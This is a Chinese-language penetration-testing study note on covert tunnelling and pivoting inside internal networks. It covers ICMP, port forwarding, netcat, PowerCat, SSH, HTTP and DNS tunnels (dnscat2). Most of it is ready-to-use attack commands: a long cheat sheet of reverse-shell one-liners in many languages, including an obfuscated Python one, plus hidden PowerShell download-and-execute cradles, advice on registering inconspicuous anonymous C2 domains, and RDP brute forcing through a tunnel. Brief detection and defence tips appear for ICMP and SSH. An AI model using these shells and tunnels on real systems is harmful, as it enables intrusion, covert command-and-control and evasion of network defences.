# 内网第三章-隐藏隧道通信技术


# 内网第三章-隐藏隧道通信技术


## <font color=red>内网连通性判断  </font>
#### 常用判断方法  
**1.ICMP协议**

```bash
ping <IP>
```
2.TCP协议
```bash
nc -zv <IP> <port>
```
3.HTTP协议
```bash
curl ip:port
```
4.DNS协议
```bash
# 1.
nslookup www.baidu.com vps-ip  # vps-ip是dns服务器的地址

# 2.
dig @vps-ip www.baidu.com
```

## 若流量不能直接流出
>常见于企业办公网段上网的场景

1. 查看网络链接，判断是否存在与其他机器的8080(不绝对)等类似端口的连接(可以尝试运行`ping -n 1 -a <ip>`)
2. 查看内网中是否有主机名类似于`proxy`的机器
3. 查看IE浏览器的直接代理
4. 根据pac文件的路径(可能是本地路径，也可能是远程路径)，将其下载下来并查看。
5. 执行以下命令，利用curl工具进行确认

```bash
curl www.baidu.com    # 不通
curl -x proxy-ip:port  www.baidu.com    # 通
```



## <font color=red> 网络层隧道技术</font>
- IPv6隧道
- ICMP隧道
  
#### IPv6隧道
常见工具：`socat`,`6tunnel`,`nt6tunnel`等

概念：通过IPv6隧道传送IPv6数据报文(把IPv6报文整体封装在IPv4数据报文中，使得IPv6报文穿过IPv4海洋，到达另一个IPv6小岛)的技术

现阶段的边界设备、防火墙甚至入侵防御系统还无法识别IPv6的通信数据，而大多数的操作系统支持IPv6，所有需要手动配置(win的网络属性中)
Note：即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包

**配置隧道与自动隧道的区别：**
只有在执行隧道功能的节点的IPv6地址是兼容IPv4地址时，自动隧道才是可行的。在为执行隧道功能的节点分配ip地址时，如果采用的是自动隧道方法，就不需要进行设置。
配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如：DHCP/人工配置或其他IPv4的配置机制


**防御：**
了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信


#### ICMP隧道
常见工具：`icmpsh`,`PingTunnel`,`icmptunnel`,`powershell icmp`等

比较特殊的协议，`不用开放端口`，最常见的ICMP消息为ping命令的回复。
将TCP/UDP数据包封装到ICMP的ping数据包中，从而穿过防火墙。

###### 工具
**1.icmpsh**
```bash
# 不需要管理员权限
# 简单，不存在正向反向
# 下载地址: https://github.com/inquisb/icmpsh
# 本机和目标都要安装
# 安装依赖库
apt-get install python-impacket


### 使用
# 我机器执行
# 先关闭本地系统的icmp应答(恢复改为0就行) -> 否则会无限刷屏
sysctl -w net.ipv4.icmp_echo_ignore_all=1

./run.sh  # 输入目标的公网ip  （此文件好像不对，用下面的py文件吧）
# 或者
./icmpsh_m.py IP(公网) IP(内网的公网ip)    # 这个的公网ip获取方法：ping外面，在外面抓包获取数据包的源地址 / 访问外面的地址然后查看网站访问日志等

# 目标机器执行（这里使用的win版本）
icmp.exe -t 192.168.1.7 -d 500 -b 30 -s 128  # 192.168.1.7我的vps

# 我的vps就会接收到反弹过来的shell
```


**2.PingTunnel**
```bash
# 下载地址：http://freshmeat.sourceforge.net/projects/ptunnel/
# 貌似可以这么安装：sudo apt install ptunnel
# 可跨平台使用。为了避免滥用，可为隧道设置密码

# 情景：得到的内网主机无法3389连接到数据库服务器，但是可以ping通。我们需以此机器为跳板访问另体贴数据库服务器

# 首先在两台机器都安装上此工具
## 安装方法
#1.安装编译
tar -zxvf ...
cd ...
make && make install
#2.如果缺少pcap.h(数据包捕获函数库),就安装
wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz
tar -zxvf ...
cd ...
./configure
#3.如果yacc包错误，安装
sudo apt-get install -y byacc
sudo apt-get install flex bison
#好了之后再安装一遍
./configure
make && make install
# 查看帮助信息
man pcap


## 使用方法
#4.运行PingTunnel(现在是linux上使用，也可在win上使用，只不过需要在内网的win服务器安装wincap类库)
# 跳板机器(假设是已获取到的web服务器)：
ptunnel -x shuteer111
# VPS上：
ptunnel -p <跳板_IP> -lp 1080 -da <另一新目标_IP> -dp 3389 -x shuteer111
# 含义：在访问本地的1080端口时，会把数据库服务器(新目标)的3389数据封装在icmp隧道中，以web服务器为'ICMP隧道跳板'进行传送(窗口会显示是本地的ip，但是实际是另一台数据库服务器的)

#5.在攻击机器访问本地的1080端口，成功访问到另一台数据库服务器的3389端口

```
参数说明：
```bash
-x    # 指定icmp隧道连接验证密码
-p    # 指定icmp隧道另一端机器(跳板)的ip地址
-lp   # 指定要监听的本地tcp端口

-da   # 指定要转发的机器的ip地址
-dp   # 指定要转发的机器的tcp端口
```


**其他工具**


###### 防御方法

通过Wireshark进行ICMP数据包分析，如下：
- 检查同一来源的ICMP数据包的数量。一个正常的ping命令每秒最多发送两个数据包，而使用ICMP隧道的浏览器会在很短的时间内产生上千个ICMP数据包
- 注意那些Payload大于64bit的ICMP数据包
- 寻找响应数据包的Payload与请求数据包中的Payload不一致的ICMP数据包
- 检查ICMP数据包的协议标签。例如：icmptunnel会在所有的ICMP Payload前面添加"TUNL"标记来标识隧道 -> 这就是特征


## <font color=red> 传输层隧道技术</font>
传输层技术包括：TCP隧道、UDP隧道、常规端口转发等

若内网防火墙阻止了指定端口的访问，在获得目标主机权限后，可以使用iptables打开指定端口

#### 1.lcx端口转发
两个版本：
- Linux 版本：`portmap`
- Widows版本：`lcx.exe`

一个客户端一个服务端

**lcx内网端口转发**
```bash
先传lcx到目标机器
#在内网目标shell上: l
cx -slave 公网ip 4444 127.0.0.1 3389  # 把目标机器的3389流量转发到指定服务器(vps)指定端口
#vps服务器(我的)上执行：
lcx -listen 4444 33891  # 将本地4444端口上监听的所有数据转发到本机33891端口

#然后远程桌面连接本地的33891端口即可
```

**lcx本地端口映射**
```bash
# 如果目标防火墙 限制了部分端口的数据(如3389)，可以进行端口转发：把3389端口的数据转发到防火墙允许的其他端口(如:53)
# 在目标主机执行
lcx -tran 53 <目标ip>: 3389
```

**linux版的portmap**
```bash
# 下载地址：http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip

# vps
./portmap -m 2 -p1 6666 -h2 公网ip -p2 7777
# 目标内网机器
./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网ip -p2 6666

```


#### 2.netcat
安装
```bash
## Linux
# http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download
#1. 
apt-get install netcat
  
# 2. 
wget ...
tar -zxvf ...
cd ...
./configure
make

## Windows
https://joncraton.org/files/nc111nt.zip
https://joncraton.org/files/nc111nt_safe.zip
```

参数
```bash

```

**使用**
Banner抓取
```bash
# banner可标识服务的版本等信息

# 题外话:追踪路由
mtr 114.114.114.114 


## nc作为客户端：
# 参数 -v  显示详细信息 
# 参数  -n  如果是域名,不进行域名解析(建议直接跟ip地址)
nc -nv 1.1.1.1 110   # 连接pop3服务器，可以看到banner信息（可以进行user登录[base64编码],输入指令）
nc -nv 1.1.1.1 25    # smtp服务器
nc -nv 1.1.1.1 80    # 探测80端口(都可进行交互的命令)

```
连接到远程主机
```bash
nc -nvv 1.1.1.1 110 
```
端口扫描
```bash
#并非擅长端口扫描, 还慢
#参数 -z 扫描参数，只判断是否开放（默认tcp）
nc -nvz 1.1.1.1  20-8080
#参数 -u  扫描udp服务的端口 （不太准确）
nc -nvzu 1.1.1.1 1-1024
```

端口监听
```bash
nc -l -p 999
# 习惯
nc -lvvp 9999
```

文件传输
```bash
# 一旦连接建立，数据流就会传入，接收文件
nc -lp 333 >1.txt
# 发送文件内容
nc -nv 192.168.0.11 < test.txt -q 1    #参数 -q: 输出完成之后过1秒就断开
```

简易聊天
```bash
nc -l -p 8888

nc -vn 192.168.0.11 8888
```

获取shell
```bash
# 参考：https://www.uedbox.com/post/54632
# https://www.secpulse.com/archives/76223.html

##### nc正向shell（正向shell -> 内网服务器之间）
1.目标主机监听：
nc -lvvp 4444 -e /bin/bash # linux
nc -lvvp 4444 -e c:\\WINDOWS\system32\cmd.exe    # win
2.本机连接目标
nc 192.168.1.11 4444


##### nc反向shell
1.本机
nc -lvvp 3333       
2.目标机器执行
nc 192.168.0.111 3333 -c /bin/bash    # Linux
nc 192.168.0.111 -e c:\\WINDOWS\system32\cmd.exe    # win



###### 如果目标主机没有nc，获取反向shell
###### 或者假如nc不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell
# bash反弹shell
/bin/bash -c bash -i >& /dev/tcp/192.168.41.13/4444 0>&1

# bash反弹shell(TCP)
目标机器： bash -i >& /dev/tcp/192.168.41.133/4444 0>&1
攻击方： nc -lvvp 4444

# bash反弹shell(UDP)
目标机器： bash -i >& /dev/tcp/192.168.41.133/4444 0>&1
攻击方监听： nc -u -lvp 4444




# python反向shell
// 方法一
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
// 方法二
$ export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
# windows python反弹shell
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"



# php反向shell
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'



# Perl反向shell
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
#
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
#NOTE: Windows only
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 



# Ruby反向shell
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
#不依赖于/bin/sh的反弹shell
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
#如果目标系统运行Windows反弹shell
ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'



# Lua反向shell
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'




# Java反弹shell
r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()



# socat反弹shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.79.137:5555




# Golang反弹shell
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go



# Telnet反弹shell
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
#获取反弹shell后，可使用python获得交互式shell
python -c'import pty; pty.spawn("/bin/bash")' python -c ''' import pty while(1):     try:         pty.spawn("/bin/bash")     except :         contiune'''



# Nodejs反弹shell
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
or
require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
or
-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')
or
https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py




# ncat反向shell
ncat 127.0.0.1 4444 -e /bin/bash
ncat --udp 127.0.0.1 4444 -e /bin/bash
# 加密
A:  ncat -c bash -allow 192.168.1.20 -vnl 3333 --ssl  #被控端(服务器端)   -allow允许连接的ip， 端口, ssl加密
B:  ncat -nv 192.168.1.19 3333 --ssl      #攻击端
# 监听端口
ncat -lvvp 777


# OpenSSL反弹shell




# crontab反弹shell




# MSF生成反弹shell




# Powershell反弹shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("[IPADDR]",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
# 或
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
# 或
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')

```

**内网代理**
```bash
# 场景：通过拿到的一台能访问的内网主机1，作为跳板(vps不能直接访问内网主机2)，拿到另外一台内网主机1才能访问到的内网主机2的shell
# vps监听
nc -lvp 3333
# 内网主机2执行
nc -lvp 3333 -e /bin/bash
# 内网主机1(边界服务器)执行
nc -v vps_ip -c "nc -v 内网主机2_ip 3333"

```




#### 3.PowerCat
>可以说是nc的powershell版本

下载地址：https://github.com/besimorhino/powercat.git

###### 用法
```bash
# 导入模块
Import-Moudle .\powercat.ps1
```

既然说是nc的powershell版本，那就可以与nc配合连接:
1.通过nc正向连接powercat
```bash
# 目标机器用powercat监听
powercat -l -p 8080 cmd.exe -v
# 攻击机连接
nc 192.168.56.130 8080 -vv

#参数
-l    # 监听
-p    # 指定端口
-c    # 指定要启动进程的名字
-v    # 显示详情
```

2.通过nc反向连接powercat
```bash
# 攻击机器监听
nc -lvv -p 8888
# 目标机器用powercat连接我们
powercat -c 192.168.56.129 -p 8888 -v -e cmd.exe
```

通过powercat返回powershell
```bash
# 如果想返回powershell，就无法与nc进行交互
# 建立正向shell

# 在目标机器执行
IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.1/powercat.ps1");
powercat -l -p 9999 -v
# 在客户端
powercat -c 10.10.10.129 -p 9999 -v -ep  # -ep用于返回powershell

```

通过powercat传递文件
```bash
# 服务端准备接收文件
powercat -l -p 9999 -of test.txt -v    # -of 输出文件名
powercat -c 10.10.10.129 -p 9999 -i c:\1.txt -v  # -i 输入：可写文件名，也可直接写字符串

```

用powercat生成payload
```bash
# 有正向、反向，且可以进行编码

##
# 客户端生成
powercat -l -p 8888 -e cme -v -g >>shell.ps1   # 生成反弹shell的脚本
#或者生成反弹powershell的脚本
powercat -l -p 7777 -ep -v -g >>shell2.ps1
# 把生成的文件上传到目标并运行
# 然后在客户端执行
powercat -c 10.10.10.129 -p 8888 -v  # 就会获得一个反弹shell


## 也可生成编码的payload
# 客户端运行
powercat -c 10.10.10.129 -p 6666 -ep -ge    # -ge  生成经过编码的payload
# 目标运行
powershell -E "上面的编码"
# 继续客户端执行
powercat -l -p 9999 -v

```

PowerCat DNS隧道通信
```bash
# 由于其dns隧道是基于dnscat设计的，所以先下载安装编译它(放在目标机器Linux)
# 下载地址：https://github.com/iagox86/dnscat2
git clone https://github.com/iagox86/dnscat2
cd dnscat2/server/
gem install bundler
bundle install


# 然后，目标机器执行
ruby dnscat2.rb ttpowercat.test -e open --no-cache
# 回到我们的机器，执行
powercat -c 192.168.56.129 -p 53 -dns ttpowercat.tect -e cmd.exe  # -dns表示使用dns进行通信
# 然后就能看到反弹回来的shell了

```

将powercat作为跳板
```bash
# 情景：vps可访问win7,但不能访问win server08 win7可访问win server08
# 以win7为跳板，来实现vps对win server08的访问

### F1
#1.在win server08执行
powercat -l -v -p 9999 -e cmd.exe
#2.在win7(跳板)执行
powercat -l -v -p 8000 -r tcp:10.10.10.129:9999
#3.vps上，连接win7
nc 192.168.56.130 8000 -vv  # 连接成功


### F2. 使用DNS协议
#1. win7上
powercat -l -p 8000 -r dns:192.168.56.129::ttpowercat.test     # 指定vps的地址
#2. vps上执行，启动dnscat
ruby dnscat2.rb ttpowercat.test -e open --no-cache
#3. win server08(目标机器)
powercat -c 10.10.10.128 -p 8000 -v -e cmd.exe
# 就可以看到反弹shell了



powercat更多用法
​```bash
# https://github.com/besimorhino/powercat
```



## <font color=red> 应用层隧道技术</font>
>使用较多

#### 1.SSH隧道
参数
```bash
-C    # 压缩传输(提高传输速度)
-f    # 后台执行
-N    # 静默连接(建立了链接，但是看不到具体会话)
-g    # 允许远程主机链接本地用于转发的端口
-L    # 本地端口转发
-R    # 远程端口转发
-D    # 动态转发(SOCKS代理)
-P    # 指定SSH端口
```

SSH配置文件
```bash
# vim /etc/ssh/sshd_config

AllowTcpForwarding yes    # 允许转发TCP协议
GatewayPorts   yes    # 是否允许逻辑主机本地转发端口
PermitRootLogin yes    #允许root登录
PasseordAuthentication   yes    # 允许使用基于密码的认证
TCPKeepAlive yes # 阻止ssh断开

# 然后重启ssh服务
```

本地转发
```bash
# 情景：vps能访问web服务器，vps不能访问数据库服务器，web服务器能访问数据库服务器(需要以web服务器为跳板)
# vps上执行
ssh -CfNg -L 1153(vps端口):1.1.1.10(目标):3389(目标端口) root@192.168.1.11(跳板机)
# 输入跳板机器的密码
# 含义：将对方的3389端口映射到本地vps的1153上
etstat -antlup |grep "1153" # 查看本地端口正在监听
# 连接本地的1153，就可以链接对面的远程链接了
rdesktop 127.0.0.1:1153

# 其实就是一个正向的tcp连接
```

远程转发
```bash
# Web服务器(跳板机器)执行
ssh -CfNg -R 3307(vps端口):1.1.1.10(目标ip):3389(目标端口) root@192.168.1.4(vps地址)
# 将目标的3389端口映射到远程vps的3307上
# 连接vps的3307，就可以链接对面的远程链接了
```

动态转发
```bash
# 动态端口映射就建立一个SSH加密的SOCKS 4/5代理通道，任何支持SOCKS 4/5的程序都可以使用这个加密通道进行代理访问

#1. vps上执行
ssh -CfNg -D 7000(vps端口) root@192.168.1.11(跳板机器地址)

#2. 浏览器设置网络代理Socks 127.0.0.1:7000。通过浏览器访问内网的机器1.1.1.2的web资源
... ... 

```


防御思路
```bash
在系统中配置SSH远程管理白名单
在ACL中限制只有特定的IP地址才能连接SSH
以及设置系统完全使用带外管理等方法

如果没有足够的资源建立带外管理的网络结构，在内网中至少要限制SSH远程登录的地址和双向访问策略(从外部到内部:从内部到外部)
```


#### 2.HTTP/HTTPS隧道
常用工具：
- reGeorg(reDuh)的升级版，把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机。流量特征明显，容易被杀软查杀   [下载地址](https://github.com/sensepost/reGeorg)
- meterpreter
- tunna([下载地址](https://github.com/SECFORCE/Tunna.git))
- 等等

###### reGeorg 工具
支持很多种脚本

```bash
#1.先把脚本文件上传到目标服务器中，然后远程访问内网网站的某脚本文件
#2.在vps上使用reGeorgSocksProxy.py 脚本来连接
python reGeorgSocksProxy.py -u http://1.1.1.1.2/tunnel.aspx -p 9999  # 本机9999端口已经开始监听了

#3.配置ProxyChains，设置全局代理
vim /etc/proxychains.conf
dynamic_chain
socks4 127.0.0.1 9999 # 设置代理端口

#4.测试代理是否正常
proxyesolv www.baidu.com    

#5.使用proxychains打开应(通过隧道进行通信)
proxychains firefox

#6.就可以使用Hydra进行暴力破解rdp(使用http隧道，不会太明显)
hydra 1.1.1.2 rdp -l administrator -P /root/pass.txt

```

Hydra 暴力破解密码(支持很多协议)
```bash
-R    # 根据上一次进度继续破解
-S    # 使用SSL协议连接
-s    # 指定端口
-l    # 指定用户名
-L    # 指定用户名字典(文件)
-p    # 指定密码破解
-P    # 制定密码字典(文件)
-t    # 指定多线程数量，默认为16个线程
-vV   # 显示详细过程
```


#### 3.DNS协议(重点)
虽然激增的DNS流量可能会被发现，但基于传统的Socket隧道已经濒临淘汰以及TCP、UDP通信大量被防御系统拦截的状况，
DNS、ICMP、HTTP/HTTPS等难以被禁用的协议已经成为i攻击者控制隧道的主要渠道
DNS是一个不可缺少的服务；另一个方面，DNS报文具有穿透防火墙的能力；也由于防火墙和IDS等大都不会过滤DNS流量，
也为DNS成为隐蔽信道创造了条件

C&C(Command and Control Server, 命令控制服务器) -- 用来管理僵尸网络和进行APT攻击的服务器
分为：C&C服务端，C&C客户端
由于安全厂商各种措施阻断了C&C通信，通过各种隧道技术实现C&C通信的技术(特别是DNS隧道技术)出现了

DNS隧道原理：
```bash
DNS查询的域名不存在，会去外网DNS服务器进行查询。如果互联网上有一台定制的服务器，依靠DNS协议即可进行数据包的交换。
在使用DNS隧道与外部进行通信时，从表面看是没有连接外网的(内网网关没有进行转发数据包)，但实际上，内网的DNS服务器进行了中专操作。
就是将其他协议封装在DNS协议中进行传输。
```


查看DNS的联通性
```bash
# 查询当前内部域名和IP地址
cat /etc/resolve.conf |grep -v '#'

# 查看能否与内部DNS通信意味着可以使用DNS隧道
nslookup    hacker.testlab

# 查看能否通过DNS服务器解析外部域名(如果可以，就意味着可以使用DNS隧道实现隐蔽通信)
nslookup    baidu.com
```

###### 1).dnscat2工具
下载地址：https://github.com/iagox86/dnscat2
https://downloads.skullsecurity.org/dnscat2/
https://github.com/lukebaggett/dnscat2-powershell

使用DNS协议创建加密的C&C通道
通过预共享密钥进行身份验证
使用Shell及DNS查询类型(TXT, MX, CNAME, A, AAAA)，多个同时进行的会话类似与SSH中的隧道

客户端是用C写的，服务端是用Ruby写的

dnscat2的隧道有两种模式：
```bash
- 直连模式：客户端直接向指定IP地址的NDS服务器发起DNS解析请求
- 中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器(速度较慢)
```

- 如果目标内网放行所有的DNS请求，dnscat2会使用`直连模式`，通过UDP的53端口进行通信(不需要域名，速度快，而且看上去仍然像普通的DNS查询)。在请求日志中，所有的域名都是以`dnscat`开头的，因此通信容易检测。
- 如果目标内网中请求仅限于白名单服务器或特定的域，dnscat2会使用`中继模式`来申请一个域名，并将运行dnscat2读无端的服务器指定为受信任的DNS服务器

DNS隧道应用场景：
```bash
在安全策略严格的内网环境中，只允许白名单流量出站，同时其他端口都被屏蔽，传统的C&C通信无碍建立，这时候Red Team还有一个选择：使用DNS隐蔽隧道建立通信
```

dnscat2特点：
```bash
- 支持多个会话
- 流量加密
- 使用密钥方式MiTM攻击
- 在内存中直接运行Powershell脚本
- 隐蔽通信
```

**使用**
1.部署域名解析
```bash
# vps(Linux)作为C&C服务端，并需要一个域名(godaddy网站。选择不显眼的域名，选择不实名的，国外的，尽量短)
1.创建A记录，把自己的域名解析服务器指向vps的ip(这里假设起名字ns1.360bobao.xyz)
2.创建NS记录，将dnsch子域名的解析结果指向A记录(名称为vpn指向ns1.360bobao.xyz)

# 检测A类解析和NS解析是否成功
在vps上抓包：
tcpdump -n -i eth0 udp dst port 53
解析测试(nslookup或dig)：
nslookup xxxxx.xxxx.xxxx
#如果能抓到对你域名进行查询的DNS请求数据包，就说明第二条NS就诶系设置已经生效
```


2.安装dnscat2服务端(在vps上)
```bash
# 先配置Ruby环境，kali内置了Ruby环境，但是运行时候可能缺少一些gem依赖包
# 这里使用ubuntu server
apt-get install gem
apt-get install ruby-dev
apt-get install libpq-dev
apt-get install ruby-bundlers

git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
bundle install

# 启动服务端b
sudo ruby ./dnscat2.rb vpn.360bobao.** -e open -c pass123456 --no-cache
# 如果是采用的直连模式，输入以下命令
sudo ruby ./dnscat2.rb --dns server=127.0.0.1,port=553,type=TXT
# 以上命令表示：监听本机的553端口，自定义连接密码pass123456

# 参数
-c    # 定义了"pre-shared secret",可使用具有预共享密钥的身份验证机制来防止中间人攻击。如果不指定，会自动生成随机字符串(记录下来，客户端需要使用)
-e    # 规定安全级别。"open" 表示服务端允许客户端不进行加密
--no-cache    # 禁止缓存(该参数务必要添加，因为power-dnscat2客户端与dnscat2服务器的Caching模式不兼容)
```


3.目标主机安装客户端
```bash
# dnscat2 客户端是C写的，所以先编译。win上可使用vs编译；Linux中直接运行`make install`
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make
# 这里使用的是直接编译好的win系统上的客户端：https://downloads.skullsecurity.org/dnscat2

# 服务端建好之后，在客户端运行测试能否与服务端通信
dnscat2-v0.07-client-win32.exe --ping vpn.360bobao.xyz
# 在客户端连接服务端
dnscat2-v0.07-client-win32.exe --dns domain=vpn.360bobao.xyz --secret pass123456
# 如果成功，会显示"Session established!" 

# 如果服务端使用的是直连模式，可以直接填写服务端ip地址(不通过DNS服务提供商)，向dnscat2服务端所在的IP弟子和请求DNS解析，命令如下
dnscat --dns server <dnscat2_server_IP>,port=53,type=TXT --secret=pass123456

# 推荐使用Powershell版本的dnscat2-powershell(目标win机器需要支持powershell2.0以上版本)：https://github.com/lukebaggett/dnscat2-powershell
#下载脚本到本地执行：
Import-Module .dnscat2.ps1
#也可在线加载脚本：
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1");
start-Dnscat2 -Domain vpn.360bobao.xyz -DNSServer  ***.***.***.***
# 也可以用以下命令，使用IEX加载脚本的方式，在内存中打开dnscat2客户端
powershell.exe -nop -w hidden -c {IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1");start-Dnscat2 -Domain vpn.360bobao.xyz -DNSServer  ***.***.***.***}

# 执行命令，创建控制台，然后就可以执行powershell命令和脚本
exec psh

```



4.反弹shell
```bash
# 交互shell， 和Metasploit类似
# 在客户端运行dnscat2.ps1脚本，在服务端就能看到客户端上线的提示



# 常用命令：
windows    # 查看当前的控制进程(每个连接都是独立的)
sessions   # 同同上
session --I 1    # 进入某个通道
window  -i 1
exec notepad.exe    # 远程打开指定程序
download    # 下载文件(慢，先把所有数据先写入缓存，最后写入硬盘) 不适合大文件
upload      # 上传文件()
clear    # 清屏
delay    # 修改远程响应延时
shell    # 得到一个反弹shell
suspend    # 返回上一层，相当于快捷键"ctrl+z"
listen    # 类似SSH隧道的—L参数(本地转发)，如：listen 0.0.0.0:53 192.168.1.1:3389
ping    # 确认主机在线，如果返回"pong"，则在线
shutdown    # 切断当前会话
quit    # 推出dnscat2控制台
kill <id> # 切断通道
set     # 设置值，例如：security=open
